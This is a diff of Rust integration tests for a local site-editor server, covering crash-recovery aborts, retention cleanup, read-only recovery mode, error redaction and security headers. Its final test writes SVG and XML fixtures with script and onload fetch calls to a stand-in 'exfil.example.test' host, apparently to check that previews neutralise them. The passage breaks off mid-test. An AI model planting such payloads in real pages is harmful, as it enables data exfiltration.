+        assert_eq!(review["review"]["status"], "adopted");
+        assert_eq!(review["review"]["reconciliationRequired"], false);
+    }
+}
+
+#[test]
+#[ignore = "subprocess-only helper for crash recovery tests"]
+fn decision_abort_child() {
+    if std::env::var_os("LP_STUDIO_TEST_ABORT_CHILD").is_none() {
+        return;
+    }
+    let runtime = tokio::runtime::Builder::new_current_thread()
+        .enable_all()
+        .build()
+        .unwrap();
+    runtime.block_on(async {
+        let root = std::path::PathBuf::from(
+            std::env::var("LP_STUDIO_TEST_STATE_ROOT").expect("child state root"),
+        );
+        let revision_id = std::env::var("LP_STUDIO_TEST_REVISION_ID").expect("child revision");
+        let proposal_id = std::env::var("LP_STUDIO_TEST_PROPOSAL_ID").expect("child proposal");
+        let review_id = std::env::var("LP_STUDIO_TEST_REVIEW_ID").expect("child review");
+        let disposition = std::env::var("LP_STUDIO_TEST_DISPOSITION").expect("child disposition");
+        let failpoint_name = std::env::var("LP_STUDIO_TEST_FAILPOINT").expect("child failpoint");
+        let occurrence = std::env::var("LP_STUDIO_TEST_FAILPOINT_OCCURRENCE")
+            .expect("child failpoint occurrence")
+            .parse::<u64>()
+            .expect("valid child failpoint occurrence");
+        let failpoint = fault_injection::Failpoint::ALL
+            .into_iter()
+            .find(|candidate| candidate.name() == failpoint_name)
+            .expect("known failpoint");
+        let config = ServerConfig::new(
+            EDITOR_ORIGIN,
+            EDITOR_HOST,
+            PREVIEW_ORIGIN,
+            &root,
+            root.join("missing-web-dist"),
+        );
+        let state = StudioState::new(config).expect("child state opens");
+        let token = bootstrap_token(&state).await;
+        let intent_id = "process-abort-intent";
+        let approval = post_for(
+            &state,
+            &token,
+            &format!("/api/v1/reviews/{review_id}/approvals"),
+            json!({
+                "schemaVersion":"1",
+                "proposalId":proposal_id,
+                "expectedRevisionId":revision_id,
+                "disposition":disposition,
+                "intentId":intent_id
+            }),
+        )
+        .await;
+        assert_eq!(approval.status(), StatusCode::CREATED);
+        let approval_token = string_at(&response_json(approval).await, "/approval/token");
+        let _scenario = fault_injection::testing::Scenario::begin();
+        fault_injection::testing::abort_on(failpoint, occurrence);
+        let _ = post_for(
+            &state,
+            &token,
+            &format!("/api/v1/reviews/{review_id}/decisions"),
+            json!({
+                "schemaVersion":"1",
+                "approvalToken":approval_token,
+                "proposalId":proposal_id,
+                "expectedRevisionId":revision_id,
+                "disposition":disposition,
+                "intentId":intent_id,
+                "rationale":"private child rationale"
+            }),
+        )
+        .await;
+        panic!("abort failpoint was not reached");
+    });
+}
+
+#[tokio::test]
+async fn every_reached_decision_failpoint_occurrence_survives_real_process_abort() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    let cases = fault_injection::Failpoint::ALL
+        .into_iter()
+        .flat_map(|failpoint| {
+            (1..=expected_adoption_occurrences(failpoint))
+                .map(move |occurrence| (failpoint, occurrence))
+        })
+        .collect::<Vec<_>>();
+    assert_eq!(cases.len(), 80, "the explicit process-abort matrix changed");
+    for (index, (failpoint, occurrence)) in cases.into_iter().enumerate() {
+        let disposition = "adopted_unchanged";
+        let harness = Harness::new().await;
+        let (project_id, revision_id, proposal_id, review_id) =
+            create_blank_fake_proposal(&harness, 3_200 + index as u128).await;
+        let Harness {
+            _root: temp_root,
+            _import,
+            state,
+            token: _,
+        } = harness;
+        let root = temp_root.path().to_path_buf();
+        drop(state);
+        drop(_import);
+
+        let output = std::process::Command::new(std::env::current_exe().unwrap())
+            .arg("--exact")
+            .arg("tests::decision_abort_child")
+            .arg("--ignored")
+            .arg("--nocapture")
+            .arg("--test-threads=1")
+            .env("LP_STUDIO_TEST_ABORT_CHILD", "1")
+            .env("LP_STUDIO_TEST_STATE_ROOT", &root)
+            .env("LP_STUDIO_TEST_REVISION_ID", &revision_id)
+            .env("LP_STUDIO_TEST_PROPOSAL_ID", &proposal_id)
+            .env("LP_STUDIO_TEST_REVIEW_ID", &review_id)
+            .env("LP_STUDIO_TEST_DISPOSITION", disposition)
+            .env("LP_STUDIO_TEST_FAILPOINT", failpoint.name())
+            .env(
+                "LP_STUDIO_TEST_FAILPOINT_OCCURRENCE",
+                occurrence.to_string(),
+            )
+            .env("RUST_BACKTRACE", "0")
+            .output()
+            .expect("crash child starts");
+        assert!(
+            !output.status.success(),
+            "{} occurrence {occurrence} did not abort",
+            failpoint.name()
+        );
+        for captured in [&output.stdout, &output.stderr] {
+            let captured = String::from_utf8_lossy(captured);
+            assert!(!captured.contains("private child rationale"));
+            assert!(!captured.contains(&root.to_string_lossy().into_owned()));
+        }
+
+        let config = ServerConfig::new(
+            EDITOR_ORIGIN,
+            EDITOR_HOST,
+            PREVIEW_ORIGIN,
+            &root,
+            root.join("missing-web-dist"),
+        );
+        let state = StudioState::new(config).expect("post-abort state recovers");
+        let token = bootstrap_token(&state).await;
+        let project =
+            response_json(get_for(&state, &token, &format!("/api/v1/projects/{project_id}")).await)
+                .await;
+        let failed_before_intent = matches!(
+            failpoint,
+            fault_injection::Failpoint::DecisionObjectWriteBefore
+                | fault_injection::Failpoint::DecisionObjectWriteAfter
+                | fault_injection::Failpoint::DecisionJournalIntentBefore
+        );
+        if failed_before_intent {
+            assert_eq!(project["project"]["history"].as_array().unwrap().len(), 0);
+            assert_eq!(project["project"]["revisionId"], revision_id);
+            assert_eq!(
+                project["project"]["activeReview"]["status"],
+                "pending_review"
+            );
+        } else {
+            assert_eq!(project["project"]["history"].as_array().unwrap().len(), 1);
+            assert!(project["project"]["activeReview"].is_null());
+            assert_ne!(project["project"]["revisionId"], revision_id);
+            let review = response_json(
+                get_for(&state, &token, &format!("/api/v1/reviews/{review_id}")).await,
+            )
+            .await;
+            assert_eq!(review["review"]["status"], "adopted");
+            assert_eq!(review["review"]["reconciliationRequired"], false);
+        }
+
+        let project_root = root.join("managed-v1/projects").join(&project_id);
+        for transient in ["transaction.json", "site.staging", "site.backup"] {
+            assert!(
+                !project_root.join(transient).exists(),
+                "{transient} survived {} occurrence {occurrence}",
+                failpoint.name(),
+            );
+        }
+        drop(state);
+        drop(temp_root);
+    }
+}
+
+#[tokio::test]
+async fn real_process_abort_preserves_reject_and_defer_without_advancing_accepted() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    let cases = [
+        (
+            "rejected",
+            fault_injection::Failpoint::DecisionReceiptPersistAfter,
+        ),
+        (
+            "deferred",
+            fault_injection::Failpoint::DecisionJournalCompleteAfter,
+        ),
+    ];
+    for (index, (disposition, failpoint)) in cases.into_iter().enumerate() {
+        let harness = Harness::new().await;
+        let (project_id, revision_id, proposal_id, review_id) =
+            create_blank_fake_proposal(&harness, 3_300 + index as u128).await;
+        let Harness {
+            _root: temp_root,
+            _import,
+            state,
+            token: _,
+        } = harness;
+        let root = temp_root.path().to_path_buf();
+        let accepted_before = source_fingerprint(
+            &root
+                .join("managed-v1/projects")
+                .join(&project_id)
+                .join("site"),
+        );
+        drop(state);
+        drop(_import);
+
+        let output = std::process::Command::new(std::env::current_exe().unwrap())
+            .arg("--exact")
+            .arg("tests::decision_abort_child")
+            .arg("--ignored")
+            .arg("--nocapture")
+            .arg("--test-threads=1")
+            .env("LP_STUDIO_TEST_ABORT_CHILD", "1")
+            .env("LP_STUDIO_TEST_STATE_ROOT", &root)
+            .env("LP_STUDIO_TEST_REVISION_ID", &revision_id)
+            .env("LP_STUDIO_TEST_PROPOSAL_ID", &proposal_id)
+            .env("LP_STUDIO_TEST_REVIEW_ID", &review_id)
+            .env("LP_STUDIO_TEST_DISPOSITION", disposition)
+            .env("LP_STUDIO_TEST_FAILPOINT", failpoint.name())
+            .env("LP_STUDIO_TEST_FAILPOINT_OCCURRENCE", "1")
+            .env("RUST_BACKTRACE", "0")
+            .output()
+            .expect("crash child starts");
+        assert!(!output.status.success());
+
+        let state = StudioState::new(ServerConfig::new(
+            EDITOR_ORIGIN,
+            EDITOR_HOST,
+            PREVIEW_ORIGIN,
+            &root,
+            root.join("missing-web-dist"),
+        ))
+        .expect("post-abort state recovers");
+        let token = bootstrap_token(&state).await;
+        let project =
+            response_json(get_for(&state, &token, &format!("/api/v1/projects/{project_id}")).await)
+                .await;
+        assert_eq!(project["project"]["revisionId"], revision_id);
+        assert_eq!(project["project"]["history"].as_array().unwrap().len(), 1);
+        assert_eq!(
+            source_fingerprint(
+                &root
+                    .join("managed-v1/projects")
+                    .join(&project_id)
+                    .join("site")
+            ),
+            accepted_before
+        );
+        let review =
+            response_json(get_for(&state, &token, &format!("/api/v1/reviews/{review_id}")).await)
+                .await;
+        assert_eq!(
+            review["review"]["status"],
+            if disposition == "rejected" {
+                "rejected"
+            } else {
+                "deferred"
+            }
+        );
+    }
 }
 
 #[tokio::test]
@@ -881,7 +2071,7 @@ async fn blocking_warnings_prevent_adoption_but_allow_reject_and_defer() {
                 .get_mut(&project_id)
                 .and_then(|project| project.proposal.as_mut())
                 .expect("pending proposal");
-            proposal.validation.status = "warning";
+            proposal.validation.status = "warning".to_owned();
             proposal.validation.checks[0].blocking = true;
         }
         let intent_id = format!("warning-disposition-{index}");
@@ -1654,6 +2844,507 @@ async fn retained_state_rehydrates_blank_project_and_immutable_revision() {
 }
 
 #[tokio::test]
+async fn retention_artifact_cleanup_is_exact_non_destructive_and_durable() {
+    let mut harness = Harness::new().await;
+    let created = response_json(
+        harness
+            .post(
+                "/api/v1/projects",
+                json!({"schemaVersion":"1","template":"blank"}),
+            )
+            .await,
+    )
+    .await;
+    let project_id = string_at(&created, "/project/id");
+    let revision_id = string_at(&created, "/project/revisionId");
+    let accepted_manifest_sha256 = string_at(&created, "/project/acceptedManifestSha256");
+
+    let export = harness
+        .post(
+            &format!("/api/v1/projects/{project_id}/exports"),
+            json!({"schemaVersion":"1","revisionId":revision_id}),
+        )
+        .await;
+    assert_eq!(export.status(), StatusCode::CREATED);
+    let export = response_json(export).await;
+    let export_id = string_at(&export, "/export/id");
+    let export_sha256 = string_at(&export, "/export/sha256");
+    let export_url = string_at(&export, "/export/downloadUrl");
+    let export_bytes = response_bytes(harness.get(&export_url).await).await;
+
+    let inventory = response_json(harness.get("/api/v1/retention").await).await;
+    assert_eq!(inventory["retention"]["automaticGc"], false);
+    assert_eq!(inventory["retention"]["telemetry"], "absent");
+    assert_eq!(
+        inventory["retention"]["cleanupRequiresExplicitConfirmation"],
+        true
+    );
+    let project = inventory["retention"]["projects"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|project| project["projectId"] == project_id)
+        .unwrap();
+    assert_eq!(project["revisionId"], revision_id);
+    assert_eq!(project["acceptedManifestSha256"], accepted_manifest_sha256);
+    let artifact = project["artifacts"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|artifact| artifact["id"] == export_id)
+        .unwrap();
+    assert_eq!(artifact["kind"], "static_export");
+    assert_eq!(artifact["sha256"], export_sha256);
+    assert_eq!(
+        artifact["payloadByteLength"].as_u64().unwrap(),
+        export_bytes.len() as u64
+    );
+
+    let mismatched_hash = harness
+        .post(
+            "/api/v1/retention/cleanup",
+            json!({
+                "schemaVersion":"1",
+                "scope":"static_export",
+                "projectId":project_id,
+                "artifactId":export_id,
+                "expectedSha256":"00".repeat(32),
+                "confirmation":export_id
+            }),
+        )
+        .await;
+    assert_eq!(mismatched_hash.status(), StatusCode::CONFLICT);
+    assert_eq!(
+        response_json(mismatched_hash).await["error"]["code"],
+        "cleanup_binding_mismatch"
+    );
+
+    // Payload length is inventory evidence, not caller-controlled deletion input.
+    // An attempted mismatched override is rejected by the strict request shape.
+    let mismatched_length_override = harness
+        .post(
+            "/api/v1/retention/cleanup",
+            json!({
+                "schemaVersion":"1",
+                "scope":"static_export",
+                "projectId":project_id,
+                "artifactId":export_id,
+                "expectedSha256":export_sha256,
+                "expectedPayloadByteLength":export_bytes.len() + 1,
+                "confirmation":export_id
+            }),
+        )
+        .await;
+    assert_eq!(mismatched_length_override.status(), StatusCode::BAD_REQUEST);
+    assert_eq!(
+        response_bytes(harness.get(&export_url).await).await,
+        export_bytes
+    );
+    let accepted_after_rejections =
+        response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
+    assert_eq!(
+        accepted_after_rejections["project"]["revisionId"],
+        revision_id
+    );
+    assert_eq!(
+        accepted_after_rejections["project"]["acceptedManifestSha256"],
+        accepted_manifest_sha256
+    );
+
+    let cleanup = harness
+        .post(
+            "/api/v1/retention/cleanup",
+            json!({
+                "schemaVersion":"1",
+                "scope":"static_export",
+                "projectId":project_id,
+                "artifactId":export_id,
+                "expectedSha256":export_sha256,
+                "confirmation":export_id
+            }),
+        )
+        .await;
+    assert_eq!(cleanup.status(), StatusCode::OK);
+    let cleanup = response_json(cleanup).await;
+    assert_eq!(cleanup["removed"]["scope"], "static_export");
+    assert_eq!(cleanup["removed"]["id"], export_id);
+    assert_eq!(
+        cleanup["removed"]["payloadByteLength"].as_u64().unwrap(),
+        export_bytes.len() as u64
+    );
+    assert_eq!(
+        harness.get(&export_url).await.status(),
+        StatusCode::NOT_FOUND
+    );
+
+    harness = harness.restart().await;
+    let accepted_after_restart =
+        response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
+    assert_eq!(accepted_after_restart["project"]["revisionId"], revision_id);
+    assert_eq!(
+        accepted_after_restart["project"]["acceptedManifestSha256"],
+        accepted_manifest_sha256
+    );
+    let inventory_after_restart = response_json(harness.get("/api/v1/retention").await).await;
+    assert!(
+        inventory_after_restart["retention"]["projects"][0]["artifacts"]
+            .as_array()
+            .unwrap()
+            .is_empty()
+    );
+    assert_eq!(
+        harness.get(&export_url).await.status(),
+        StatusCode::NOT_FOUND
+    );
+}
+
+#[tokio::test]
+async fn failed_proposal_cleanup_allows_next_proposal_before_and_after_restart() {
+    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
+    let mut harness = Harness::new().await;
+    let (project_id, revision_id, first_proposal_id, first_review_id) =
+        create_blank_fake_proposal(&harness, 7_100).await;
+    let first_evidence =
+        transition_review_to_terminal_denial(&harness, &project_id, &first_review_id);
+    reconcile_and_cleanup_failed_proposal(
+        &harness,
+        &project_id,
+        &first_proposal_id,
+        &first_review_id,
+    )
+    .await;
+
+    let second = create_fake_proposal_for_project(&harness, &project_id, &revision_id, 7_101).await;
+    let second_proposal_id = string_at(&second, "/proposal/id");
+    let second_review_id = string_at(&second, "/proposal/reviewId");
+    let second_evidence =
+        transition_review_to_terminal_denial(&harness, &project_id, &second_review_id);
+    reconcile_and_cleanup_failed_proposal(
+        &harness,
+        &project_id,
+        &second_proposal_id,
+        &second_review_id,
+    )
+    .await;
+
+    let (repository_path, journal_path) = harness
+        .state
+        .storage()
+        .unwrap()
+        .synapse_paths(&project_id)
+        .unwrap();
+    let repository = SynapseRepository::open(repository_path).unwrap();
+    for (proposal_ref, proposal_head) in [&first_evidence, &second_evidence] {
+        assert_eq!(
+            repository.refs().get(proposal_ref).unwrap().unwrap().head,
+            proposal_head.as_str(),
+            "failed Proposal cleanup must retain the authoritative Ref"
+        );
+    }
+    let journal = SqliteReviewJournal::open(journal_path).unwrap();
+    for review_id in [&first_review_id, &second_review_id] {
+        assert_eq!(
+            journal
+                .get_review(&JournalReviewId::parse(review_id.to_owned()).unwrap())
+                .unwrap()
+                .state(),
+            JournalReviewState::TerminalDenial,
+            "failed Proposal cleanup must retain the terminal journal row"
+        );
+    }
+    drop(journal);
+    drop(repository);
+
+    harness = harness.restart().await;
+    let third = create_fake_proposal_for_project(&harness, &project_id, &revision_id, 7_102).await;
+    assert_ne!(string_at(&third, "/proposal/reviewId"), first_review_id);
+    assert_ne!(string_at(&third, "/proposal/reviewId"), second_review_id);
+}
+
+#[tokio::test]
+async fn retention_project_cleanup_requires_exact_accepted_binding_and_is_durable() {
+    let mut harness = Harness::new().await;
+    let created = response_json(
+        harness
+            .post(
+                "/api/v1/projects",
+                json!({"schemaVersion":"1","template":"blank"}),
+            )
+            .await,
+    )
+    .await;
+    let project_id = string_at(&created, "/project/id");
+    let revision_id = string_at(&created, "/project/revisionId");
+    let accepted_manifest_sha256 = string_at(&created, "/project/acceptedManifestSha256");
+
+    for request in [
+        json!({
+            "schemaVersion":"1",
+            "scope":"project",
+            "projectId":project_id,
+            "expectedRevisionId":format!("rev_{}", "0".repeat(32)),
+            "expectedManifestSha256":accepted_manifest_sha256,
+            "confirmation":project_id
+        }),
+        json!({
+            "schemaVersion":"1",
+            "scope":"project",
+            "projectId":project_id,
+            "expectedRevisionId":revision_id,
+            "expectedManifestSha256":"00".repeat(32),
+            "confirmation":project_id
+        }),
+        json!({
+            "schemaVersion":"1",
+            "scope":"project",
+            "projectId":project_id,
+            "expectedRevisionId":revision_id,
+            "expectedManifestSha256":accepted_manifest_sha256,
+            "confirmation":"prj_wrong"
+        }),
+    ] {
+        let rejected = harness.post("/api/v1/retention/cleanup", request).await;
+        assert_eq!(rejected.status(), StatusCode::CONFLICT);
+        assert_eq!(
+            harness
+                .get(&format!("/api/v1/projects/{project_id}"))
+                .await
+                .status(),
+            StatusCode::OK
+        );
+    }
+
+    let cleanup = harness
+        .post(
+            "/api/v1/retention/cleanup",
+            json!({
+                "schemaVersion":"1",
+                "scope":"project",
+                "projectId":project_id,
+                "expectedRevisionId":revision_id,
+                "expectedManifestSha256":accepted_manifest_sha256,
+                "confirmation":project_id
+            }),
+        )
+        .await;
+    assert_eq!(cleanup.status(), StatusCode::OK);
+    let cleanup = response_json(cleanup).await;
+    assert_eq!(cleanup["removed"]["scope"], "project");
+    assert_eq!(cleanup["removed"]["id"], project_id);
+    assert!(
+        cleanup["retention"]["projects"]
+            .as_array()
+            .unwrap()
+            .is_empty()
+    );
+    assert_eq!(
+        harness
+            .get(&format!("/api/v1/projects/{project_id}"))
+            .await
+            .status(),
+        StatusCode::NOT_FOUND
+    );
+
+    harness = harness.restart().await;
+    assert!(
+        response_json(harness.get("/api/v1/projects").await).await["projects"]
+            .as_array()
+            .unwrap()
+            .is_empty()
+    );
+    assert!(
+        response_json(harness.get("/api/v1/retention").await).await["retention"]["projects"]
+            .as_array()
+            .unwrap()
+            .is_empty()
+    );
+}
+
+#[tokio::test]
+async fn fail_closed_storage_starts_capability_limited_read_only_recovery() {
+    let root = tempfile::tempdir().unwrap();
+    let config = || {
+        ServerConfig::new(
+            EDITOR_ORIGIN,
+            EDITOR_HOST,
+            PREVIEW_ORIGIN,
+            root.path(),
+            root.path().join("missing-web-dist"),
+        )
+    };
+    let normal = StudioState::new(config()).unwrap();
+    let normal_token = bootstrap_token(&normal).await;
+    let created = response_json(
+        post_for(
+            &normal,
+            &normal_token,
+            "/api/v1/projects",
+            json!({"schemaVersion":"1","template":"blank"}),
+        )
+        .await,
+    )
+    .await;
+    let project_id = string_at(&created, "/project/id");
+    let revision_id = string_at(&created, "/project/revisionId");
+    let accepted_manifest_sha256 = string_at(&created, "/project/acceptedManifestSha256");
+    drop(normal);
+
+    let layout = root
+        .path()
+        .join("managed-v1/projects")
+        .join(&project_id)
+        .join("layout.json");
+    std::fs::write(&layout, br#"{"schemaVersion":"1","layoutVersion":"999"}"#).unwrap();
+    let normal_error = StudioState::new(config()).unwrap_err();
+    assert_eq!(normal_error.kind(), std::io::ErrorKind::InvalidData);
+
+    let disk_before_recovery = source_fingerprint(root.path());
+    let recovery = StudioState::new_recovery(config()).unwrap();
+    let bootstrap = editor_router(recovery.clone())
+        .oneshot(
+            Request::builder()
+                .uri("/api/v1/bootstrap")
+                .header(HOST, EDITOR_HOST)
+                .header("sec-fetch-site", "same-origin")
+                .body(Body::empty())
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    assert_eq!(bootstrap.status(), StatusCode::OK);
+    let bootstrap = response_json(bootstrap).await;
+    assert_eq!(
+        bootstrap["capabilities"]["operatingMode"],
+        "read_only_recovery"
+    );
+    assert_eq!(bootstrap["capabilities"]["importAvailable"], false);
+    assert!(
+        bootstrap["capabilities"]["recoveryPointCount"]
+            .as_u64()
+            .is_some_and(|count| count >= 1)
+    );
+    let recovery_token = string_at(&bootstrap, "/session/token");
+
+    let points = response_json(get_for(&recovery, &recovery_token, "/api/v1/recovery").await).await;
+    let points = points["recoveryPoints"].as_array().unwrap();
+    assert_eq!(
+        bootstrap["capabilities"]["recoveryPointCount"].as_u64(),
+        Some(points.len() as u64)
+    );
+    let accepted = points
+        .iter()
+        .find(|point| {
+            point["kind"] == "last_accepted"
+                && point["projectId"] == project_id
+                && point["diagnostic"]["verified"] == true
+        })
+        .unwrap();
+    assert_eq!(accepted["revisionId"], revision_id);
+    assert_eq!(accepted["artifactManifestSha256"], accepted_manifest_sha256);
+    let export_url = string_at(accepted, "/exportUrl");
+    let export = get_for(&recovery, &recovery_token, &export_url).await;
+    assert_eq!(export.status(), StatusCode::OK);
+    assert_eq!(
+        export.headers().get(CONTENT_TYPE).unwrap(),
+        "application/zip"
+    );
+    assert_eq!(
+        export
+            .headers()
+            .get("x-content-sha256")
+            .unwrap()
+            .to_str()
+            .unwrap()
+            .len(),
+        64
+    );
+    assert_eq!(
+        export
+            .headers()
+            .get("x-recovery-point-binding")
+            .unwrap()
+            .to_str()
+            .unwrap()
+            .len(),
+        64
+    );
+    let mut archive = zip::ZipArchive::new(Cursor::new(response_bytes(export).await)).unwrap();
+    assert!(archive.by_name("index.html").is_ok());
+    assert!(archive.by_name("styles.css").is_ok());
+
+    let mutation = post_for(
+        &recovery,
+        &recovery_token,
+        "/api/v1/projects",
+        json!({"schemaVersion":"1","template":"blank"}),
+    )
+    .await;
+    assert_eq!(mutation.status(), StatusCode::LOCKED);
+    assert_eq!(
+        response_json(mutation).await["error"]["code"],
+        "read_only_recovery"
+    );
+    assert_eq!(source_fingerprint(root.path()), disk_before_recovery);
+}
+
+#[tokio::test]
+async fn recovery_contract_accepts_a_valid_snapshot_above_the_synthetic_500_file_profile() {
+    let root = tempfile::tempdir().unwrap();
+    let project_id = "prj_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+    let revision_id = "rev_bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
+    let artifact_manifest_sha256 = "c".repeat(64);
+    let mut files = BTreeMap::from([(
+        "index.html".to_owned(),
+        b"<!doctype html><html lang=\"en\"><body>recovery</body></html>".to_vec(),
+    )]);
+    for index in 0..500 {
+        files.insert(format!("assets/file-{index:04}.txt"), b"x".to_vec());
+    }
+    assert_eq!(files.len(), 501);
+    let expected_total_bytes = files.values().map(Vec::len).sum::<usize>();
+    let (storage, projects) = ManagedStorage::open(root.path()).unwrap();
+    assert!(projects.is_empty());
+    storage
+        .create_project(
+            project_id,
+            "Maximum recovery fixture",
+            revision_id,
+            &artifact_manifest_sha256,
+            &files,
+        )
+        .unwrap();
+    drop(storage);
+
+    let state = StudioState::new_recovery(ServerConfig::new(
+        EDITOR_ORIGIN,
+        EDITOR_HOST,
+        PREVIEW_ORIGIN,
+        root.path(),
+        root.path().join("missing-web-dist"),
+    ))
+    .unwrap();
+    let token = bootstrap_token(&state).await;
+    let points = response_json(get_for(&state, &token, "/api/v1/recovery").await).await;
+    let accepted = points["recoveryPoints"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|point| point["projectId"] == project_id)
+        .unwrap();
+    assert_eq!(accepted["diagnostic"]["verified"], true);
+    assert_eq!(accepted["diagnostic"]["fileCount"], 501);
+    assert_eq!(
+        accepted["diagnostic"]["totalBytes"].as_u64(),
+        Some(expected_total_bytes as u64)
+    );
+    let export_url = string_at(accepted, "/exportUrl");
+    let export = get_for(&state, &token, &export_url).await;
+    assert_eq!(export.status(), StatusCode::OK);
+    let archive = zip::ZipArchive::new(Cursor::new(response_bytes(export).await)).unwrap();
+    assert_eq!(archive.len(), 501);
+}
+
+#[tokio::test]
 async fn import_is_session_bound_rescanned_consumed_persisted_and_source_preserving() {
     let source = tempfile::tempdir().unwrap();
     std::fs::write(
@@ -1990,6 +3681,26 @@ async fn mutation_security_fails_closed_with_stable_redacted_errors() {
         .await
         .unwrap();
     assert_eq!(response.status(), StatusCode::FORBIDDEN);
+    let request_id_header = response
+        .headers()
+        .get("x-request-id")
+        .unwrap()
+        .to_str()
+        .unwrap()
+        .to_owned();
+    assert!(request_id_header.starts_with("req_"));
+    let operation_id_header = response
+        .headers()
+        .get("x-operation-id")
+        .unwrap()
+        .to_str()
+        .unwrap()
+        .to_owned();
+    assert!(operation_id_header.starts_with("op_"));
+    assert_eq!(
+        response.headers().get("x-error-code").unwrap(),
+        "request_origin_rejected"
+    );
     let body = response_json(response).await;
     assert_eq!(body["schemaVersion"], "1");
     assert_eq!(body["error"]["code"], "request_origin_rejected");
@@ -2004,6 +3715,57 @@ async fn mutation_security_fails_closed_with_stable_redacted_errors() {
             .starts_with("req_")
     );
     assert_eq!(body["error"]["retryable"], false);
+    assert_eq!(body["error"]["requestId"], request_id_header);
+    assert_eq!(body["error"]["operationId"], operation_id_header);
+    assert_eq!(
+        body["error"]["detail"],
+        json!({
+            "acceptedState":"unchanged",
+            "recoveryAction":"correct_request"
+        })
+    );
+    assert_eq!(body.as_object().unwrap().len(), 2);
+    assert_eq!(body["error"].as_object().unwrap().len(), 6);
+    assert_eq!(body["error"]["detail"].as_object().unwrap().len(), 2);
+
+    let correlation_canary = "PRIVATE-CORRELATION-CANARY";
+    let canary_response = editor_router(harness.state.clone())
+        .oneshot(
+            Request::builder()
+                .method("POST")
+                .uri("/api/v1/projects")
+                .header(HOST, EDITOR_HOST)
+                .header(CONTENT_TYPE, "application/json")
+                .header(AUTHORIZATION, format!("Bearer {}", harness.token))
+                .header("x-request-id", correlation_canary)
+                .header("x-operation-id", correlation_canary)
+                .body(Body::from(r#"{"schemaVersion":"1","template":"blank"}"#))
+                .unwrap(),
+        )
+        .await
+        .unwrap();
+    let generated_request_id = canary_response
+        .headers()
+        .get("x-request-id")
+        .unwrap()
+        .to_str()
+        .unwrap()
+        .to_owned();
+    let generated_operation_id = canary_response
+        .headers()
+        .get("x-operation-id")
+        .unwrap()
+        .to_str()
+        .unwrap()
+        .to_owned();
+    let canary_body = response_json(canary_response).await;
+    assert_eq!(canary_body["error"]["requestId"], generated_request_id);
+    assert_eq!(canary_body["error"]["operationId"], generated_operation_id);
+    assert!(
+        !serde_json::to_string(&canary_body)
+            .unwrap()
+            .contains(correlation_canary)
+    );
 
     let wrong_host = editor_router(harness.state.clone())
         .oneshot(
@@ -2020,6 +3782,63 @@ async fn mutation_security_fails_closed_with_stable_redacted_errors() {
 }
 
 #[tokio::test]
+async fn direct_api_errors_use_exact_bounded_recovery_details() {
+    let cases = [
+        (
+            ApiError::new(
+                StatusCode::CONFLICT,
+                "decision_outcome_unknown",
+                "The Decision outcome is unknown.",
+                true,
+            ),
+            "reconciliation_required",
+            "reconcile",
+        ),
+        (
+            ApiError::new(
+                StatusCode::SERVICE_UNAVAILABLE,
+                "read_only_recovery",
+                "Managed storage is in read-only recovery mode.",
+                false,
+            ),
+            "unchanged",
+            "manual_recovery",
+        ),
+        (ApiError::internal(), "reconciliation_required", "refresh"),
+        (ApiError::conflict("stale_base"), "unchanged", "refresh"),
+        (ApiError::invalid(), "unchanged", "correct_request"),
+    ];
+
+    for (error, accepted_state, recovery_action) in cases {
+        let response = error.into_response();
+        let request_id = response
+            .headers()
+            .get("x-request-id")
+            .unwrap()
+            .to_str()
+            .unwrap()
+            .to_owned();
+        let operation_id = response
+            .headers()
+            .get("x-operation-id")
+            .unwrap()
+            .to_str()
+            .unwrap()
+            .to_owned();
+        let body = response_json(response).await;
+        assert_eq!(body.as_object().unwrap().len(), 2);
+        assert_eq!(body["error"].as_object().unwrap().len(), 6);
+        assert_eq!(body["error"]["detail"].as_object().unwrap().len(), 2);
+        assert_eq!(body["error"]["requestId"], request_id);
+        assert_eq!(body["error"]["operationId"], operation_id);
+        assert_eq!(body["error"]["detail"]["acceptedState"], accepted_state);
+        assert_eq!(body["error"]["detail"]["recoveryAction"], recovery_action);
+        assert!(request_id.starts_with("req_"));
+        assert!(operation_id.starts_with("op_"));
+    }
+}
+
+#[tokio::test]
 async fn editor_responses_deny_framing_and_allow_only_the_preview_origin() {
     let harness = Harness::new().await;
     let response = editor_router(harness.state)
@@ -2033,6 +3852,18 @@ async fn editor_responses_deny_framing_and_allow_only_the_preview_origin() {
         .unwrap();
     assert_eq!(response.status(), StatusCode::OK);
     assert_eq!(response.headers().get("x-frame-options").unwrap(), "DENY");
+    assert_eq!(
+        response.headers().get("x-content-type-options").unwrap(),
+        "nosniff"
+    );
+    assert_eq!(
+        response.headers().get("referrer-policy").unwrap(),
+        "no-referrer"
+    );
+    assert_eq!(
+        response.headers().get("x-dns-prefetch-control").unwrap(),
+        "off"
+    );
     let csp = response
         .headers()
         .get("content-security-policy")
@@ -2044,6 +3875,134 @@ async fn editor_responses_deny_framing_and_allow_only_the_preview_origin() {
     assert!(csp.contains("script-src 'self'"));
     assert!(csp.contains("style-src 'self' 'unsafe-inline'"));
     assert!(!csp.contains("script-src 'self' 'unsafe-inline'"));
+}
+
+#[tokio::test]
+async fn active_non_html_preview_documents_are_inert_while_image_assets_keep_their_type() {
+    let source = tempfile::tempdir().unwrap();
+    std::fs::write(
+        source.path().join("index.html"),
+        br#"<!doctype html><img src="active.svg"><a href="active.svg">Open SVG</a><a href="active.xml">Open XML</a>"#,
+    )
+    .unwrap();
+    std::fs::write(
+        source.path().join("active.svg"),
+        br#"<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://exfil.example.test/svg')"><script>location.href='https://navigate.example.test/'</script><a href="https://link.example.test/"><rect width="10" height="10"/></a></svg>"#,
+    )
+    .unwrap();
+    std::fs::write(
+        source.path().join("active.xml"),
+        br#"<?xml version="1.0"?><root><script src="https://exfil.example.test/xml.js"/></root>"#,
+    )
